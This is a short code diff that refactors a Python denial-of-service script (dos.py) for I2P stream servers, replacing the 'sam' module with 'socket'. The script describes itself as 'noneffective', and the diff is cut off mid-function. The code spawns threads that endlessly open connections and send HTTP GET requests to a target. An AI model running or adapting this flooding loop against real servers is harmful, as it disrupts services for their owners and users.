@@ -1,19 +1,20 @@
+#! /usr/bin/env python
 
 # -----------------------------------------------
 # dos.py: Noneffective denial of service tool
 # -----------------------------------------------
 
-from i2p import sam
+from i2p import socket
 import threading, sys
 
 def dos_stream(dest):
   """Perform a DOS attack on a stream server."""
-  dest = sam.resolve(dest)
+  dest = socket.resolve(dest)
 
   # DOS code, runs in n separate threads.
   def f():
     while True:
-      S = sam.socket(dest, sam.SOCK_STREAM)
+      S = socket.socket(dest, socket.SOCK_STREAM)
       S.connect(dest)
       S.send('GET / HTTP/1.0\r\n\r\n')
       S.close()
